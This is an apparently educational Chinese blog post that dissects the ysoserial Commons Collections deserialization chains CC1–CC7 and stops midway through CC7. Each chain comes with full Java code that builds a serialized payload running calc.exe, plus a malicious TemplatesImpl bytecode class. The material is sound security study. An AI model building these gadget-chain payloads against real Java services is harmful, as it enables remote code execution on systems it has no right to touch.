# Java 安全学习 Day2 -- ysoserial CC 系列


> 经过了一个月的咕，Java 安全学习之路终于从 Day1 跨越到了 Day2（建议直接改名 Month2 好吧

## 0x00 前言

从这篇文章开始就进行 [ysoserial](https://github.com/frohoff/ysoserial) 中各种链的分析了，这篇文章主要是分析看起来常见的 commons-collections 系列的反序列化链分析

就从 CC1 到 CC7 一个一个来吧，不知道什么时候才能写完

## 0x01 CommonsCollections1

> 依赖：commons-collections:commons-collections:3.1
>
> 注意：该链仅在 JDK 1.7.0_67 版本通过测试，1.8、11、16 版本均无法成功，原因可能为 1.8 及之后版本 AnnotationInvocationHandler 的 readObject 方法发生变化，后续利用链均以 JDK 1.7.0_67 为例进行分析

ysoserial 中利用链如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                	Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                	Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                            	    Runtime.exec()
```

首先可以看出来这条链中有很多 `Transfomer`，和他们的名字一样，这些类都实现了 `Transformer` 接口并提供不同的功能。

接口声明位于 commons-collections/src/java/org/apache/commons/collections/Transformer.java 文件中：

```java
/*
 *  Copyright 2001-2004 The Apache Software Foundation
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package org.apache.commons.collections;

/**
 * Defines a functor interface implemented by classes that transform one
 * object into another.
 * <p>
 * A <code>Transformer</code> converts the input object to the output object.
 * The input object should be left unchanged.
 * Transformers are typically used for type conversions, or extracting data
 * from an object.
 * <p>
 * Standard implementations of common transformers are provided by
 * {@link TransformerUtils}. These include method invokation, returning a constant,
 * cloning and returning the string value.
 * 
 * @since Commons Collections 1.0
 * @version $Revision: 1.10 $ $Date: 2004/04/14 20:08:57 $
 * 
 * @author James Strachan
 * @author Stephen Colebourne
 */
public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);

}
```

接口非常简单，只有一个 `transform` 函数，功能也非常简单，把一个 `object` 转换成另一个 `object`，具体怎么转换就看实现类是怎么写的了，总之接收一个 `Object` 返回一个 `Object` 就行。

这里涉及到了三个 `Transformer`：`ChainedTransformer`、`ConstantTransformer` 和 `InvokerTransformer`，他们的实现都位于 commons-collections/src/java/org/apache/commons/collections/functors 的对应文件中，依次进行分析。

### ChainedTransformer

> Transformer implementation that chains the specified transformers together.
>
> The input object is passed to the first transformer. The transformed result is passed to the second transformer and so on.

根据功能描述，`ChainedTransformer` 的作用大概就是把一堆奇形怪状的 `Transformer` 放到一起，依次进行 `transform`，前一个的输出是后一个的输入。

有一个存放 `Transformer` 的属性：

```java
private final Transformer[] iTransformers;
```

可以通过 `getInstancce` 静态方法创建 `ChainedTransformer` 实例：

```java
public static Transformer getInstance(Transformer[] transformers)
public static Transformer getInstance(Collection transformers)
```

并通过 `transform` 方法执行 `Transformer` 链：

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

`transform` 方法中依次执行了各个 `Transformer` 的 `transform` 方法并将输出依次传下去。



### ConstantTransformer

> Transformer implementation that returns the same constant each time.

三个 `Transformer` 中最简单的一个，每次返回一个相同的常量。

有一个存放常量的 `iConstant` 属性：

```java
private final Object iConstant;
```

`transform` 方法直接返回该属性：

```java
public Object transform(Object input) {
    return iConstant;
}
```



### InvokerTransformer

> Transformer implementation that creates a new object instance by reflection.

可以通过反射创建对象实例（实际是直接调用方法），非常危险的一个 `Transformer`。

有三个与反射相关的属性：

```java
private final String iMethodName;
private final Class[] iParamTypes;
private final Object[] iArgs;
```

其中，`iMethodName` 是反射调用的方法名，`iParamTypes` 是所调用方法的类型列表，`iArgs` 是调用方法的参数列表。

可以通过 `getInstance` 静态方法创建 `InvokerTransformer` 实例：

```java
public static Transformer getInstance(String methodName)
public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args)
```

并通过 `transform` 方法进行方法调用，`transform` 方法的核心代码如下：

```java
public Object transform(Object input) {
	...
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
	...
}
```

通过反射获取 `input` 的 `class` 中 `iMethodName` 和 `iParamTypes` 对应的方法，并通过 `invoke` 进行调用。



将上述三个 `Tranformer` 结合使用，构造出 `Runtime.getRuntime().exec()` 即可进行 RCE：

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(0);
```



### LazyMap

往前继续看，这里通过 `LazyMap.get` 触发 `Transformer` 链。

`LazyMap` 是 CC 中的一个 `Map` 实现，源码注释中这样描述它：

> Decorates another Map to create objects in the map on demand.

`LazyMap` 的实现位于 commons-collections/src/java/org/apache/commons/collections/map/LazyMap.java 文件中

有一个 `Transformer` 类型的属性 `factory`：

```java
protected final Transformer factory;
```

其 `get` 方法实现如下：

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

在 `get` 方法中遇到不存在的 `key` 时，会调用 `factory` 的 `transformer` 方法来创建对应的值，把这里的 `factory` 换成我们构造的 `Transformer` 链，即可通过该方法触发 RCE：

```java
Transformer[] transformers = new Transformer[] {
    ...
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
lazyMap.get(null);
```



### Map(Proxy)

这里涉及到了动态代理的内容，关于动态代理的详细介绍见上一篇文章 [Java 安全学习 Day1 -- 基础知识 - X5tar's Blog](/posts/java-sec-day1/#动态代理)

简单来说就是创建一个代理对象实例化一个接口，这个代理对象有一个 `invoke` 方法，当调用这个接口实例的任何方法时都会调用代理对象的 `invoke` 方法，通过 `invoke` 方法对调用进行处理。

这里就是通过这个动态代理触发后续 `AnnotationInvocationHandler` 的 `invoke` 方法，在下一部分会具体介绍 `AnnotationInvocationHandler` 的细节。



### AnnotationInvocationHandler

`Annotation` 的一个动态代理实现，这里用到了两次，首先用它触发整条反序列化链，然后触发 `LazyMap` 的 `get` 方法。

#### AnnotationInvocationHandler.invoke

该动态代理的 `invoke` 方法，调用接口实例的任何方法都会调用该方法进行处理，用于触发 `LazyMap` 的 `get` 方法。

`AnnotationInvocationHandler` 类有一个 `Map` 类型的属性：

```java
private final Map<String, Object> memberValues;
```

并在 `invoke` 方法中会调用该属性的 `get` 方法：

```java
Object result = memberValues.get(member);
```

这样我们只需要通过 `AnnotationInvocationHandler` 创建一个动态代理，结合之前的 `Map(Proxy)` 创建一个 `Map` 接口实例，调用任意方法，即可触发我们之前完成的链：

```java
Transformer[] transformers = new Transformer[] {
    ...
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
Constructor aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
aih.setAccessible(true);
InvocationHandler handler = (InvocationHandler) aih.newInstance(Override.class, lazyMap);
Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{ Map.class }, handler);
mapProxy.entrySet();
```

#### AnnotationInvocationHandler.readObject

整条反序列化链的触发点：

```java
Iterator var4 = this.memberValues.entrySet().iterator();
```

通过该类的反序列化，触发之前完成的 `mapProxy` 的 `entrySet` 方法，最终触发整个 RCE 反序列化链。

### 反序列化链

最终完成整条反序列化链如下：

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
Constructor aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
aih.setAccessible(true);
InvocationHandler handler = (InvocationHandler) aih.newInstance(Override.class, lazyMap);
Map testMap = new HashMap();
Map mapProxy = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), handler);
InvocationHandler handler0 = (InvocationHandler) aih.newInstance(Override.class, mapProxy);
byte[] out = serialize(handler0);
```



## 0x02 CommonsCollections2

> 依赖：org.apache.commons:commons-collections4:4.0

ysoserial 中利用链如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
                TransformingComparator.compare()
                    InvokerTransformer.transform()
                        Method.invoke()
                        	Runtime.exec()
```

其中 `InvokerTransformer` 与 3.1 版本变化不大，从 `InvokerTransformer` 开始往前分析。

### TransformingComparator

一个用于比较大小的类，但进行比较前会通过 `Transformer` 对需比较的两个类进行 `transform`。

有一个 `Transformer` 类型的属性：

```java
private final Transformer<? super I, ? extends O> transformer;
```

有一个 `compare` 方法可以调用 `transformer` 属性的 `transform` 方法：

```java
public int compare(final I obj1, final I obj2) {
    final O value1 = this.transformer.transform(obj1);
    final O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

一个比较简单的思路是利用 CC1 中的 `Transformer` 链，但是 ysoserial 中用了更简单的方法，这里我们先用 `Transformer` 链进行测试：

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Comparator comparator = new TransformingComparator(chainedTransformer);
comparator.compare(null, null);
```



### PriorityQueue

我们现在可以用 `TransformingComparator` 触发` transform`，接下来需要找到一个可以触发 `compare` 操作的类，这里 `ysoserial` 中用了 `PriorityQueue`，即优先队列。

在 `PriorityQueue` 中进行两个元素之间的优先级比较可以使用我们提供的 `comparator`，并调用该 `comparator` 的 `compare` 方法，这样就可以触发我们之前的 `TransformingComparator`。

有一个 `Comparator` 类型的属性，可以在创建实例时传入：

```java
private final Comparator<? super E> comparator;
```

在进行 `siftDown` 操作时，如果有自定义的 `comparator` 即使用该 `comparator` 进行比较：

```java
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
...
private void siftDownUsingComparator(int k, E x) {
    ...
    if (right < size &&
        comparator.compare((E) c, (E) queue[right]) > 0)
        c = queue[child = right];
    if (comparator.compare(x, (E) c) <= 0)
        break;
    ...
}
```

而在 `PriorityQueue` 反序列化方法的末尾处，会调用 `heapify` 方法，从而触发 `siftDown` 操作：

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    ...
    heapify();
}
...
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

为了防止在构造过程中触发 RCE，先构造一个无害的 `ChainedTransformer`，在构造完成后再通过反射修改其中的链，ysoserial 中也是这么进行操作的。

### 使用 ChainedTransformer 的反序列化链

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    }),
};
Transformer chainedTransformer = new ChainedTransformer(new ConstantTransformer(1));
Comparator comparator = new TransformingComparator(chainedTransformer);
Queue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(1);
Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
iTransformers.setAccessible(true);
iTransformers.set(chainedTransformer, transformers);
byte[] out = serialize(queue);
```

---

但是 ysoserial 中对于这条链使用了 `TemplatesImpl` 类，无需使用 `ChainedTransformer` 构造链即可 RCE。

> TemplatesImpl 类在其它 Java 反序列化的利用中也多次出现在重要的位置。

### TemplatesImpl

在 `com.sun.org.apache.xalan.internal.xsltc.trax` 中定义，是用来处理 XML 文件的类。

要利用 `TemplatesImpl` 进行 RCE，首先要了解 JVM 中类的加载过程和 `defineClass` 方法。类的加载即 `ClassLoader `机制在上一篇文章有讲到，这里介绍一下 `defineClass` 方法。

#### defineClass

在 Java 程序运行时，JVM 会通过 `ClassLoader` 加载 class 文件，将类加载到内存中。除此之外，`ClassLoader` 也提供了一个 `defineClass` 方法，直接加载存放在 `byte[]` 中的字节码，如果我们能控制加载的字节码，就能执行任意 Java 代码。

#### 利用链挖掘

首先可以找到 `defineTransletClasses` 方法中调用了 `defineClass`：

```java
_class[i] = loader.defineClass(_bytecodes[i]);
```

这里的 `loader` 是经过修改的 `TransletClassLoader` 类的实例，这个类只重写了 `defineClass` 方法：

```java
static final class TransletClassLoader extends ClassLoader {
    TransletClassLoader(ClassLoader parent) {
        super(parent);
    }
    Class defineClass(final byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
}
```

然后发现一共有三处调用了 `defineTransletClasses` 方法，分别位于 `getTransletClasses`、`getTransletIndex` 和 `getTransletInstance` 方法中。

观察发现 `getTransletInstance` 方法中调用 `defineTransletClasses` 方法后对 `defineClass` 加载的类进行了实例化，但实例化的类的索引需为 `_transletIndex`：

```java
if (_name == null) return null;
if (_class == null) defineTransletClasses();
AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
```

因此我们选择这个方法进行利用。回到 `defineTransletClasses` 方法，发现当被加载的类为 `AbstractTranslet` 的子类时，其索引被赋给 `_transletIndex` ：

```java
final Class superClass = _class[i].getSuperclass();
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
    _transletIndex = i;
}
```

由于 `getTransletInstance` 方法仍为 private 方法，继续找调用链，发现只有一个 `newTransformer` 方法调用了该方法，且 `newTransformer` 为 public 方法：

```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    ...
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
                                      _indentNumber, _tfactory);
    ...
}
```

可以使用该方法进行触发。

因此要想使用 `TemplatesImpl` 类进行 RCE，我们需要满足以下条件：

- 令 `_name` 不等于 `null`
- 字节码所对应的类为 `AbstractTranslet` 的子类
- 调用 `newTransformer` 方法

首先构造一个恶意 `AbstractTranslet` 子类：

```java
public class EvilTranslet extends AbstractTranslet {
    public EvilTranslet() {
        try {
            java.lang.Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

将其编译成字节码，然后读入 `byte[]`，再通过反射传入 `TemplatesImpl` 进行利用：

```java
File file = new File("EvilTranslet.class");
FileInputStream fis = new FileInputStream(file);
byte[] bytecode = new byte[(int) file.length()];
fis.read(bytecode);
byte[][] bytecodes = new byte[][]{ bytecode };

TemplatesImpl templates = new TemplatesImpl();
Field _bytecodes = templates.getClass().getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);
_bytecodes.set(templates, bytecodes);
Field _name = templates.getClass().getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates, "evil");
templates.newTransformer();
```

可以将 `TemplatesImpl` 与 `InvokerTransformer` 进行结合使用：

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
invokerTransformer.transform(templates);
```

再与 `TransformingComparator` 和 `PriorityQueue` 进行结合使用，即可得到完整的反序列化链。

### 使用 TemplatesImpl 的反序列化链

```java
File file = new File("EvilTranslet.class");
FileInputStream fis = new FileInputStream(file);
byte[] bytecode = new byte[(int) file.length()];
fis.read(bytecode);
byte[][] bytecodes = new byte[][]{ bytecode };

TemplatesImpl templates = new TemplatesImpl();
Field _bytecodes = templates.getClass().getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);
_bytecodes.set(templates, bytecodes);
Field _name = templates.getClass().getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates, "evil");

InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
Comparator comparator = new TransformingComparator(invokerTransformer);
Queue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(templates);
byte[] out = serialize(queue);
```



## 0x03 CommonsCollections3

> 依赖：commons-collections:commons-collections:3.1
>
> Variation on CommonsCollections1 that uses InstantiateTransformer instead of InvokerTransformer.

整体利用思路与 [CC1](#0x01-commonscollections1) 基本相同，区别在于 `ChainedTransformer` 中使用的 `Transformer` 不同。

这里需要两个之前没有出现过的东西，一个是 `InstantiateTransformer`，之前没有出现过的一个 `Transformer`，另一个是 `TrAXFilter`，与 `TemplatesImpl` 来自同一个包，同样是用来处理 XML 的类。

### InstantiateTransformer

> Transformer implementation that creates a new object instance by reflection.

可以在 `transform` 的过程中创建类的实例，如果找到一个构造函数可以恶意利用的类，即可用这个 `Transformer` 进行利用。

有两个属性，分别用来存放参数类型和参数：

```java
private final Class[] iParamTypes;
private final Object[] iArgs;
```

在 `transform` 方法中会通过反射创建类的实例：

```java
Constructor con = ((Class) input).getConstructor(iParamTypes);
return con.newInstance(iArgs);
```

### TrAXFilter

在这个类的构造函数中，接收一个 `Templates` 类型的变量，并调用了其 `newTransformer` 方法，可以与 [CC2](#0x02-commonscollections2) 中所介绍的 `TemplatesImpl` 结合使用，从而进行 RCE。

### 反序列化链

将上述类结合使用，构造出最终的反序列化链：

```java
File file = new File("EvilTranslet.class");
FileInputStream fis = new FileInputStream(file);
byte[] bytecode = new byte[(int) file.length()];
fis.read(bytecode);
byte[][] bytecodes = new byte[][]{ bytecode };

TemplatesImpl templates = new TemplatesImpl();
Field _bytecodes = templates.getClass().getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);
_bytecodes.set(templates, bytecodes);
Field _name = templates.getClass().getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates, "evil");

Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
Constructor aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
aih.setAccessible(true);
InvocationHandler handler = (InvocationHandler) aih.newInstance(Override.class, lazyMap);
Map testMap = new HashMap();
Map mapProxy = (Map) Proxy.newProxyInstance(testMap.getClass().getClassLoader(), testMap.getClass().getInterfaces(), handler);
InvocationHandler handler0 = (InvocationHandler) aih.newInstance(Override.class, mapProxy);
byte[] out = serialize(handler0);
```

其中 `EvilTranslet.class` 与 [CC2](#利用链挖掘) 中相同。



## 0x04 CommonsCollections4

> 依赖：org.apache.commons:commons-collections4:4.0
>
> Variation on CommonsCollections2 that uses InstantiateTransformer instead of InvokerTransformer.

和 CC3 一样就是把 `InvokerTransformer` 换成了 `InstantiateTransformer`，利用了 `TxAXFilter` 类，其它地方没有变化，直接上代码了。

### 反序列化链

```java
File file = new File("EvilTranslet.class");
FileInputStream fis = new FileInputStream(file);
byte[] bytecode = new byte[(int) file.length()];
fis.read(bytecode);
byte[][] bytecodes = new byte[][]{ bytecode };

TemplatesImpl templates = new TemplatesImpl();
Field _bytecodes = templates.getClass().getDeclaredField("_bytecodes");
_bytecodes.setAccessible(true);
_bytecodes.set(templates, bytecodes);
Field _name = templates.getClass().getDeclaredField("_name");
_name.setAccessible(true);
_name.set(templates, "evil");

Transformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
Comparator comparator = new TransformingComparator(instantiateTransformer);
Queue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(TrAXFilter.class);
byte[] out = serialize(queue);
```

`EvilTranslet.class` 同样与 [CC2](#利用链挖掘) 中相同。



## 0x05 CommonsCollections5

> 依赖：commons-collections:commons-collections:3.1
>
> This only works in JDK 8u76 and WITHOUT a security manager
>
> 经过测试 1.7.0_67 版本也可以使用，作者应该是想说 8u76 修了这个洞吧（？

ysoserial 中利用链如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        BadAttributeValueExpException.readObject()
            TiedMapEntry.toString()
                LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                        	Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                        	Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                        	Runtime.exec()
```

`LazyMap` 之后都和 CC1 完全一样，区别就在于 `LazyMap.get` 的触发，这里用了一条新的链来进行触发。

### TiedMapEntry

一个简单的 `Map.Entry` 实现，其中 `getValue` 方法会调用 `map` 的 `get` 方法：

```java
public Object getValue() {
    return map.get(key);
}
```

且 `hashCode` 和 `toString` 方法中都会调用 `getValue` 方法：

```java
public int hashCode() {
    Object value = getValue();
    return (getKey() == null ? 0 : getKey().hashCode()) ^
        (value == null ? 0 : value.hashCode()); 
}
public String toString() {
    return getKey() + "=" + getValue();
}
```

使得使用该类触发 `LazyMap.get` 方法更加通用。

### BadAttributeValueExpException

> 源码里甚至添加了说明：the serialized object is from a version without JDK-8019292 fix，应该就是 8u76 修复了这个问题

`readObject` 方法中通过 `System.identityHashCode` 方法调用了 `hashCode`：

```java
val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
```

从而可以触发上面的 `TiedMapEntry`

### 反序列化链

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
Map.Entry entry = new TiedMapEntry(lazyMap, null);
Exception exception = new BadAttributeValueExpException(entry);
byte[] out = serialize(exception);
```



## 0x06 CommonsCollections6

> 依赖：commons-collections:commons-collections:3.1

ysoserial 中利用链如下：

```
Gadget chain:
    java.io.ObjectInputStream.readObject()
        java.util.HashSet.readObject()
            java.util.HashMap.put()
            java.util.HashMap.hash()
                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                        java.lang.reflect.Method.invoke()
                        	java.lang.Runtime.exec()
```

`TiedMapEntry` 之后的利用链与 CC5 相同，区别在于触发 `TiedMapEntry.hashCode` 的方式。

这里是用了 Java 原生的 `HashSet` 和 `HashMap` 进行触发。

### HashSet

反序列化 `readObject` 方法中调用了 `HashMap.put`：

```java
map.put(e, PRESENT);
```

### HashMap

`put` 方法中对参数 `key` 调用了 `hash` 方法：

```java
int hash = hash(key);
```

`hash` 方法中又调用了 `hashCode`：

```java
h ^= k.hashCode();
```

最终可以通过这条链触发 `TiedMapEntry.hashCode`。

### 反序列化链

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{
        String.class, Class[].class,
    }, new Object[]{
        "getRuntime", new Class[0],
    }),
    new InvokerTransformer("invoke", new Class[]{
        Object.class, Object[].class,
    }, new Object[]{
        null, new Object[0],
    }),
    new InvokerTransformer("exec", new Class[]{
        String.class,
    }, new Object[]{
        "calc.exe",
    })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);
Map.Entry entry = new TiedMapEntry(new HashMap(), null);
Set hashSet = new HashSet();
hashSet.add(entry);
Field map = entry.getClass().getDeclaredField("map");
map.setAccessible(true);
map.set(entry, lazyMap);
byte[] out = serialize(hashSet);
```



## 0x07 CommonsCollections7

> 依赖：commons-collections:commons-collections:3.1

ysoserial 中利用链如下：

```
Payload method chain:

java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
```

`LazyMap` 之后的利用链也和 CC1 相同，前面用了新的链进行触发。

### AbstractMap

由于 `LazyMap` 没有实现 `equals` 方法，所以调用其 `equals` 方法即调用其父类 `AbstractMapDecorator` 的 `equals` 方法：

```java
public boolean equals(Object object) {
    if (object == this) {
        return true;
    }
    return map.equals(object);
}
```

即调用其所包装的 `map` 的 `equals` 方法。

如果这里包装的是 `HashMap` 而其没有实现 `equals` 方法，就会调用其父类 `AbstractMap` 的 `equals` 方法：

```java
public boolean equals(Object o) {
	...
    Map<K,V> m = (Map<K,V>) o;
	...
            if (value == null) {
                if (!(m.get(key)==null && m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))
                    return false;
            }
	...
}
```

而此处调用了参数的 `get` 方法，可以此触发 `LazyMap.get` 从而完成利用。

### Hashtable

这里使用 `Hashtable` 来充当反序列化链的触发点，其反序列化过程中调用了自身的 `reconstitutionPut` 方法：

```java
private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException
{
    ...
    for (; elements > 0; elements--) {
        K key = (K)s.readObject();
        V value = (V)s.readObject();
        reconstitutionPut(newTable, key, value);
    }
    ...
}
```

而 `reconstitutionPut` 方法中又调用了 `equals`：

```java
private void reconstitutionPut(Entry<K,V>[] tab, K key, V value)
    throws StreamCorruptedException
{
    ...
    int hash = hash(key);
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<K,V> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    Entry<K,V> e = tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

而这里想要触发 `equals` 方法需要满足两个条件：

- `tab[index] != null`：即相同的 `index` 应出现两次
- `e.hash == hash`：即两个相同的 `index` 对应的 `Entry` 的键对应的 `hash` 相同

这里会发现 `hash` 相同则 `index` 一定相同，所以可能会认为只要设置两个相同的 `key` 使得 `hash` 相同即可。

相同的 `key` 确实可以触发 `equals`，但是回到一开始的 `LazyMap.get` 的触发条件，`get` 需要接收一个不存在的 `key` 才可以触发 `transform`，所以我们需要找到两个值不相等但 `hash` 相等的变量。

这里 ysoserial 用了字符串，查看 `String.hashCode` ：

```java
public int hashCode() {
    int h = hash;
    if (h == 0 && value.length > 0) {
        char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}
```

这里只需要找到四个字符分成两个不同的组(AB、CD)，使得 31 * A + B == 31 * C + D 即可。ysoserial 中使用了 yy 和 zZ，但这里还存在很多种可能。

### 反序列化链

由于 `Hashtable` 的 `put` 方法中也存在同样的判断，为了防止构造时触发 RCE，这里先构造两个个不会触发 `equals` 的 `LazyMap` 并插入 `Hashtable` 中，然后将其中一个清空，换为可以和另一个一起触发 `equals` 的 `key`。

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class,
        }, new Object[]{
                "getRuntime", new Class[0],
        }),
        new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class,
        }, new Object[]{
                null, new Object[0],
        }),
        new InvokerTransformer("exec", new Class[]{
                String.class,
        }, new Object[]{
                "calc.exe",
        })
};
Transformer chainedTransformer = new ChainedTransformer(transformers);
